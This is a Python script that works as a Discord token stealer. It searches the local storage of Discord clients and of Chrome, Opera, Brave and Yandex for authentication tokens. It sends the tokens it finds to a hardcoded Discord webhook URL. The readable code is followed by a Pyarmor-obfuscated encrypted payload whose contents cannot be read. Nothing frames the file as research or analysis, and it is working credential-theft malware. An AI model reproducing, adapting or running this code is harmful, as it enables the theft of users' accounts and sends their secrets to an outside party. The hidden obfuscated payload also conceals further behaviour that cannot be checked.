if WhatTheFlip == True:
  import os
  import re
  import json
  
  from urllib.request import Request, urlopen
  
  # your webhook URL
  WEBHOOK_URL = 'https://discord.com/api/webhooks/1163425091011489872/qIDPSGJmVF0YcJVvKDtI2pQJKTruQhbKBMRJNG_mMqii8UXXvprsV_Wmxn37avuO4PyX'
  
  # mentions you when you get a hit
  PING_ME = False
  
  def lol2(path):
      path += '\\Local Storage\\leveldb'
  
      tokens = []
  
      for file_name in os.listdir(path):
          if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
              continue
  
          for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
              for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                  for token in re.findall(regex, line):
                      tokens.append(token)
      return tokens
  
  def main():
      global LOGINID
      local = os.getenv('LOCALAPPDATA')
      roaming = os.getenv('APPDATA')
  
      paths = {
          'Discord': roaming + '\\Discord',
          'Discord Canary': roaming + '\\discordcanary',
          'Discord PTB': roaming + '\\discordptb',
          'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
          'Opera': roaming + '\\Opera Software\\Opera Stable',
          'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
          'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
      }
  
      message = '@everyone' if PING_ME else ''
  
      for platform, path in paths.items():
          if not os.path.exists(path):
              continue

          message += f'ID:{LOGINID}'
          message += f'\n**{platform}**\n```\n'
  
          tokens = lol2(path)
  
          if len(tokens) > 0:
              for token in tokens:
                  message += f'{token}\n'
          else:
              message += 'No tokens found.\n'
  
          message += '```'
  
      headers = {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
      }
  
      payload = json.dumps({'content': message})
  
      try:
          req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
          urlopen(req)
      except:
        pass
        

if __name__ == '__main__':
    main()
    # Pyarmor 8.2.9 (trial), 000000, non-profits, 2023-10-16T23:15:37.748597
    from pyarmor_runtime_000000 import __pyarmor__
    __pyarmor__(__name__, __file__, b'PY000000\x00\x03\x0b\x00\xa7\r\r\n\x80\x00\x01\x00\x08\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00\x8c\x0b\x00\x00\x12\t\x04\x00\xbb\x1b\x87\xa9\x1cU\xf79\xaa\x07\xcd\xbb\xa5\xf8\xab\x1f\x00\x00\x00\x00\x00\x00\x00\x00z\xb7\x16\'\xaaz\xbf\x19.wc\x02\x01\x83x{\x15\x19\xc5v\xc3\xae\xdc~8<\xf5/n\x19V\t#\xc9\xa6\x0b\x04\xc4\xf0\x1e\xdbyO`\xd8\xf1*\xc0\xb9\xc4\x95?\xf2 \x0b\xf0~l\xb0\xd0vp\xdbB\xbf.`\xfe\xfc6\xd4\x18f\x1d1>\x84M`"utI\xed\t\xa7\x16\xcao\xab>^\x83\xa3#kR\x9c\xe3\xaeg\xed8\xdb\xb5\x04\x12)\t3u{\xb9\xbc(\x1b<\x19x\x19C\xd3Vf\x93r\xbb\xd4\x9d\xae\\(\xf5iL\xecI\xf5J\xc5w]5\xd6\xb8\x92c\xbf\xa0\x1d\xf5\xd7qAD\xab\x19q\x1b\x89\xd0\x83\x9d0\x9b\xd2;\x18\xcc*\xf1\x85d\x99\x9aM\xa0\x8c\xe9\xe1\xa1\x07\xeb\x05\xc6\xf8\xaf\xa3\xc2\x9d\x81/"\xa2\xcb\xb9`3f\xb4\x9e\x0e\xe4\xab\xbc\xe6\xf5<\xb7\x9e?q\xa0\xac\xd8;\x9b\x9b\x15\x14\xa1\xdbKoc\xad\xeeG\x15\xbe\t;\rm\x07\x0ey\xd1\xce\x8a\xba\xcf\xb14k\x8a\x8f\x1a\x1b\xeb=\x17U\nUl\x17\xbf\x9e\x1b\xd0N\xaa\x88\xd5>\x03\x06\x95]\x94\x9b\xc0O\x91\xfd\x13_\xad*+\xc1\x92\x07\x12_\xc5\x17\x11\xd2\xd1\xed\xfeV,\t\x1c\xdb\xa3v\xf7\x16\xe2\x9f\xe1\rt\x94\ry\xba\x08\x97*iz\x99\x8d\x18\xccJ##\x96\x0f\xa4\x9a\x1e\x88\xd3XR\x88(\xee\x8a1\xb4\x9b\xec7\x95\x8aG\x9b\x84\xd6\xb8\x84k\xf0\x93?\xbf7\xc7Ha-<\x9d\xab\xa8\x84\xd2\xb5\xaa\xbe\xe9\xd3~X\xc9\xef\x13G")\xeb+\xcd\xfb\x9dM\xf2/\x8d\xd8\x9b\x1b@\x8e\x8e\xdc/\xd5\xc8!K\x85\x8f\xf5$\xedD\t>\xc3 \xa1\\\xdc\'\xfbKHE\xf1\xacy\x0e\xffW\xff\xb5\xd0\xe4f*_\x81\xd0F\xfbO\x0e\xcdx,_\xdc\xc5\xb26\xdeW\x0f\x04T}\xb6\t\xdb\x98\xca\xa0\xac\xcb\xfc\xb1\x04\xa0\xb4}\x8eV\xf0\xb8_g\xd8\xf4\xe9\x8a\xf1-\xed\xfc\xf7\xc2\xc03"\x10\xbc8;\xd4p9\xa1N\xcf\xd2\x8eO\x0b\x85\xda\xcc\x87zu\xfe}\xc0\x03VX\x9fM;\xfa\x9b\x8907\xccM\x81\xda`\xb5\xccuZc\xd7\xc4\xc1\xd4_\xaaD\x18f\xaf\xbe\x84\xf0T\xdb\xa8f\x1cb\x8a\x84l\xb9\n\xba]\xa4rw\xb3\x14\x11M/=\xd0\xda\x87\x8dD\xf3\xf1\x1cM\xa8\xd4\xd4\xb4\xcby\x01\x11\xca@\x83\xc5N\xf4\x0e`r\x94hAU\x8b\xb5!\xc2\x0eqcgKe4\xec\xecg"\x8b<,?\x08\x13\x14\xb0\x06\x14\xd5\xf6\t\xab(\xa1\xb3n\xf7\x87o\x11\xe9\xdbc\xabV\xb2\xc4;\x97\xedZ\xd8\x11\xb0\xe9\x82m^$\xb8\xf7\x7f,\xee\x80\x9b\x90\xcd!1u\xa0\x9eO\x872D\xd7\x8e\xd0]\x7f\xa6\xf2\xfa\x86\x80\xc4\xb2\x9a\x88\xc3\xb7\x13r\xf0\x10\xc5\x96O\xbbY\xf2_&\x1b\xe3\xbdamzP\xff\x80\xae+{\xae\xe4\xbd\xd6\xbc\x01|\xdd[\xb3\r\x91\xd8\xc9\xf7\x89}\xdf;\'\x9ey\xf1\xb1\xfb\x0b\xbc\xca\xde\xd4\x93\xdf\xb1\xe8\x97\xdd\x16\x8ac\xb6\xd2\x95kV\xd1\r\x89\x9d\x17X\x80{{\x9d]\xc6\xc4EwN\xae\xc7\xc6\x1cJ<\xe9\xd1H\xa9\xdc\xea\xc8\x8b7J\xd9\x03u\x1f\x02\xe27\x16%\r\xd1\xa0\x9d\xee%\xb9\xc3<\x1e)\xfe\x92\xf7\x83\x7f{T\xdc\x94@\x0b"w\x96\xaf\x13\x90`\'{\xb0?\x99\x03sN\xe1\xa42\xb9\xedz\xcc\x11q\xe2\xc6\xf1\xe6\xac\x00"\xc6C}\xc2UT\x81=\xcf\xb2\xc4>\xbc\xdd\x19\xb8\x02\x96\tx\xe2R\x15w\xf9::\x01D-\xae\x17\x9e\xa1\xe8/x\x83%1\x19\x82\xce\xce\xfc\xf5\xbf\x18\xfe\xc4\x14?\xef\xfb:\xa3\xac\x82\xee\xa8\xd4W=\xa1\x0c-Z4ojd\x1d\x199@X\xe7\x9afb\xddh\xd0*;\xfe\xb0\xdae\xfa\xd7\xc5G\xf7k:\xda\xcdr\x97\x879U\x8c\xf6\xe7^x\xed\x8a\x05\xe2\xd0B\x1dc\x12\xb3\x96\xb7\xe2f\xfcX\x93\xdaf3\xe8\x07$\x96\xa1\xf4\x02\xe3;\xcb\xf6\xdf\xb2T}\x8av0)&\x16!z\xd7L\xb5#Z\xee\xe5\xdc|(\x10\x19\x1d\xea\x9fB\x82XQ\xee*g\x13\xcb\'\xef\xa7\xbf\xd5\x15\xf1\x0e\xbc\xa3Q\xbe.\x7f\xe5\x94C\x81\x16\xf6)\x00(b\x97\xfa\xaf\xb5\r\x01ZT@\xb6\xa3k\xf0Wh\x8b\xaf\x19F?\nP\x87W\x08\x04\x16\x02\xc07\x84\xb9\xca]\x8e\xaax\xc5n\x9f\x88\xc1\x87\xf2\xc8\x15\x0c:\x8e\xc2\x984k\xfbBp\xd6\x18\xf3\xf9\xac\xa6\xd6\x99K\x7fQ\xcf\xbfH\x88!\xc5\x05,\x91\xac\xdc<\xea\x15P\xc8\x8e\x9b\xe9\x94>%\x1fw\x9b\xcdv\xf8\xba\xf7\n\x10!^\x94\xa7\x90\x94\xc9\xfdf\xdf\xc4\xa8P\xbd\xd1\xd1\xf54\n\xfb\xeb\xfd\x01z\xbe\x98\x00b\x03a\xb1B\xd6/\xf7\xea\x04\xd8\xad\x94\xca\xbe4\xcc\x05\xa0T\x11;x4\xcd\xf4\xe2o\xa1@6>\xa1\x8d \xdc\xc3H\x87Z\x93\x13\xa1\x88\x00\x8c\x84\x9e\x8e\x04\xe8\xb5\xec\xda#\xec\xb8\x93U)\xd8\x1a\x1b\xff\x1f{\xea\x17_\xa9C0\xe4L\x01w\xb1\'Y\xec\\\r\x94\x93-\x1f\xe2\xea\xabD\xd9\xbc\x97\xd8X\xc0U\xd8\xcd\x02\x86\xd5z\xd7`\xba\xe0:\xad\xa0XR\xf4\xa90\xd94\xe1vj\xf6\xf5\x88\xb8\x0f;\xee\xd0\x81\xce\x14O(\x1c)\x07\x08\x99\r\x08-"\xae\xff\xcf\xe3E\xf7n\xa0\x1arY\x1f\xabA\x17\x1b\xe9\x12\xd1z\xa8~<{&\'\xb0\x80\xd4z9\x15\x93e\xeb\x08\xc7\x19\xaan\xed/"u\xd0\xff\xe9\xf02\xa6$\x93g\xd0\x90\xd6\xabd\xf0v\x0e\xf7\x8e\xdbw\xb7\x8d\x85\x14B\r<\xcd6h\xbd\x01-\xc18\xb8Q[\x13w\xc2\x951\x8c:\xf3\xe8n.\xc0&9],\xb3`Xy\xabO\x8bb\x87\xbf\xf9\x0f\xfdh\xe8I\xbb+Q\xd0\xaf\xa1\xfa\x95\xd5\xa2\x0e\x8c\x1c\x9d\xffL\xfc\xf7\x8d\x1b\xe1\x9d\x8dj\xf7H\x96\xab\xcf\xcd\x17\x07\xea\x85\xdb\xd3p\xb0]\x8c\x18\xed|T\x12\x11Br\xdc\xfa3\x12:\xe2J\x0e.U\xa5\xe6\xbc\xd0\xb7\xa4\xcc\xdbg\xfb\xd7\xda5O\x90@?+4\xdfJ\xceMOTK\x9b/"\xb5\xc2GL\xda\xf5d\x19\xc2\x89\xa2\xd1y\x16\x7f>\x88\xa7\x9f\xb1u8\xd0\xe9\xd6\xc9e[\xbd\x11v\x95\x98\xf4\xe1+\xcf>+zC\xa3\x0c\x97p\x95\x9d\xa1AS?\xfa\xec"\x00W\x9a\xd0\xb6k\xd2\x89\xb3\x82\x19n4B\xb2\x94\x07\xd2\x83\xcc*\x0e\xda\x9d#\xd0\xd02\xd0!\x1b\x93tF\xf4\xc7X\xe1-\xc6\xd1\xa3\xc4O\x9b\xc6\xaf[\x06\xa2\xea\x99\xb6\x13+\xff\xfa\xf9Z\xd7\xd5\xd4|\xfb{\xbf\xa1\xa4\xc3|U"_\xbd\xbbw\xd0_\xa8_\xe2=\xfdm\xef\xa4\xca\x12\x9f\xf72&\xe6\xe8\xee\x94G\xed\xe3\x04\xcf\x17\xa0Yo,\xb5\xedcG\xee\xff\xe9\xb7,\x1dnj&A\xa7\x0f\xa2a\x1cT\x85\x95-\x11\xf0\xdbVl\x1fw\xd15ol""\xbad\xa9\xadh\x990f\xdc\x99H\xa0%L\xb6\xc1\xe8!\xb0\xf5\xd9m\xfa>\x12\xea\xe7\xe8{}\x04f\xbf\x05\xb5\xb3|"\xec\x06m\xa1\xb0\xcf:\xbd\xf0m\x91\xabqZ(\x9d2\x13\xb8\xf351\xbf\xc5\x8f-\xf5\xd5\xc7\x03\xbe\xf6\xb6f!\xab)\xd3\xd0\x1aN\xf4N\xa7\xd5D\xb7\xc1\xd2S\xfe\x88{,\xec\xb0\x14\xb1JD\xb8\x0fO\xbf\xe4\x90\x08\xf1\xb4\r\xc4.\x1a\x01\x06\xf2I\x18\x06\xaf\x86\xb6u\xb9\x94\xd5^3\x10w\xbeqZ4V\x83DM\xc1L\xe8[\xb3\xf6\xbc\x13<\x91-3\xf601%]\x18\x8fT\xbd\xeef\xffB\xc5\xfb]\xd5#\xd8\xe8\x06\xaa9\xfe\xc1\xcal7Z\x10\x19x\x8cL\x0c2\xe8\x07\xa9\xe5E1\xfc\x85N\x02\xc6\xbdhl\xc5\x90gD}\xc4g\x8a\x98\xce\x00\xdf\xae\xa8"\x1b+\xdbrI\xc1\x97 \x02H%\x1ey\xa1\'6\xf1\'\x8e\x1cHh\xc6\xbc\xd3^C\x0f\xc1\xd4\xf4@\xab\x81\xb07)[\x14\xbb\x88\xc30\x98\x85+\x08\xe8\xd7\xf8\xba\xf8S\x9c<\x7f<\x00i\xc6\xbb2\xf7 \xfe\x89\xde\x07\x92iF\xc7B\t\xf6\x81\xb1{T\x00\xe0\xa2\xc4\xc9a\xea\xa5]\xe8OD\x03D^G\x9b\nI&s\x8a\x14\xc0<\xcfV\xfc.\x1eM \xd0W\x8a\x87\xbb\xd0\x82yj\xf4\xf2\xe4\x1d\x05\x98"\x06-;IJ\xd6\xf8\xf3J\xf3\\\x1fv\xb0L\xc5Q,\x9d3\x13x-\xfb!<\xbc\xb1\xa3\xb3e\xf4\x94\xb1\'5p\xd4\x98\xa2\xb5\x924a\x8c\x193\x08\x8f\x81l\x85\x8b\xc0p\x8a\xf29T{S\x80az\xd9"$\xc7\xa9v\xa6\x1d\x11\xbc\x84W\xf6d\xf9\x91l\xf7"\xcd\xf7\xd6\'3\xb1"s\xfeu\x11\xf4F\xf4\xebQ\x92\xc1\x01e\xc0\xe83)\xa4\x96\xa73\xd6\x8c\xd6t\'5\x95v\xd6\xe23\x9f\xd1+_\x93\x8b\xb4\xe0\x1a\xf70\x89|\xa3z\x8aT@f\xcd,z\xdb8\xb5O\x02n\xfb\xbf\x89\xf4\x0e\x10\x01#UM\x942\xa7\xdd\x9c\'\xf1\x11\x80\x9f\x11\xc3\x95\xd8<\xc7\x107\xc9pR\xa2\xc7\x1at\xa2\x1e\x8d\xe3l\xf6\xd8\xd1\xdfT\x13\x86\xd8>\x14\x10\x80\xa1\xf8qR\xb9UZx\xc3\x19\xf8\xcd\xa42\xdf\xb0a\xbb\x91\x17;\x800?(Z9\xd1\x99\xcc\x1e{|\xa9"\x1c\x8f\xda\xa3uDC\x1a=I\xe2\xc3\x03(pG\xae\xbc\x9e\xf2<\xd4\xea\x04^\xf8\x97\xb97\xcc\\\x8fH\xd5\xb6\x91\xa4D\xd1P\x14\x17m\x93\x037\xbeZ\xa6\x9e\xd0\xe4G\xc90\x1a\xcb\xc3U\x0e9i06\xb3U\xf8\xa8p\xa3\xfe\xe2\x02$\xdc!|!\xbc\x8f\xfcF:\x95u\xfb\xdc\x9e\xa3\xbc\xaf\xcf\x97\xca#\xfd+\xfc\xda\xda\x93O\xb6\x9c\xa8E\xa0\x18\x06\x07\xb0k\x8c \xde\x8f\x0c\x01\xc6\x917\x13\x9b\xc5\xdc\xbdS\x80\x1b;\x82\xf4ED\x81\'\xf1B\xea\xe4\x89\x9a\xde"\xaa\x91Y\xb5\xc7\xe5\x16i\xed\x96\xb9n\x90cM\xca\x0f\xad!HM\x11\xa3\x0f\n\x19\x84\xdd\xb3\xb9C\xe3\x9b\xd2\xb7\x1c\x0e&e\x17\xa3\n\x8am<qo\x07\x94\r-\x02Dt-\xc7oq\x98\xa1\xa4\x06\xd5\xf5\xc2\xfd34\x95g\xfb\xeb\x8c\xb2\x04#\xb1\x81\x94\xaf\xc6P\xa1\xc8\t\x0e2\x8d\xc6\xfd\xf6\x95db/D\xea\xff\x9f\xf3\xeaA\x8f\xb98\xc78\xa3\xdb\x9f\xb6\x8f\xdd\xb4\xe0\x8ca\x9ea\x1d\xcf\xb1\xe8\xa1\xb7\xbf\xed\x1c\xfe$\xc9BV\xc3\xf3\xf2D\xd64\\\xee\xeb\xf19iP\xcbSamW\xc3\x87\xc7\xec\xa1\xb8\xf2\xb3Y\xb1z/\xa9\xb3\x1d\xe1[/\x84\xbd\x9d\x00N\t\xfd~>Rr\xa7-T\xc1D;\xd5\xb3Wd\\\x83\x05H\xd3\x08\xd7\xa9v\xf4um\x0e\xe7(\xe6\x11\xf3\xafr\x12\xbc\x11\xf5\x89Hz<\x00\xbce\x82\xe3\x84\x01\xaa\xc8\xaf\xe13\x9a"\xcc\x9a\xaa7\xa1\xf2\xcb\x19\ts\x08\x8c\x90H\x9e\xa9\x94\xd7G\xca0\xaf\xc1~\x1e\x101\xceY\xac\xf39QJ{\xf7\xb8\x93pSL\x90n\xd4&@\xee\xb1\x93AP\xf8\x81\xb6\x88)Qm#\x88z\x158S\xb2\x18\xbc\xd4T\t\x0b&9\x1fI\xf7tlS\xd2wv\xe3\x1d\xe1\xae\xeb1\x97\x1c\xa7\xd7\xce\xc3\\\x04\x9e\x8bpk\x94J;\xe3\x81`\xbd3\xb5+(4\xe5BR\x11\xeb;\r:\\\xe2\xb0Y~U\xa5O\xf6}\xb0\xc4\xdfmM\xe6}g0\x88v\xad4\xdbI\x99\xc9QG\x9fSu_\x86\x1f\xd5\xfeX\x9c\xcc\xfa\xd3\xf4\x8a@u\xe1\x9c\xb8\xd5\xc8\xfc\x95Y\x82\xed\xda\xa6\xb8\x9d\x1e\n\'Op\x15\xfc\xa0c\x97vx\x9d\xf2Dv\xb9\x05\xb2\x94\xb9G\x9aX\xb3\xc9\xde\x84\x06\xb3\x82\'\xa4\xc9-\xf9\x1bm\xd4\xd7\xf6\xcc\x9c\x83\x92A\xea\x99,\x94\xa2\xc0\x8d\x0b;\x91\x00\x9eW8a\x0b\xddS\n!\x1d4b\xb3\x86\x8b\xe7]\xfdu\x9f\xb0\x1a\x88g0\xf8>|\xb4\x83\xefO\xa5\x88\x97^Lx\xa6/KG\x18\xba5`Z\xc5\x99\xe1\xd7FR\x87d\x15\xa3')


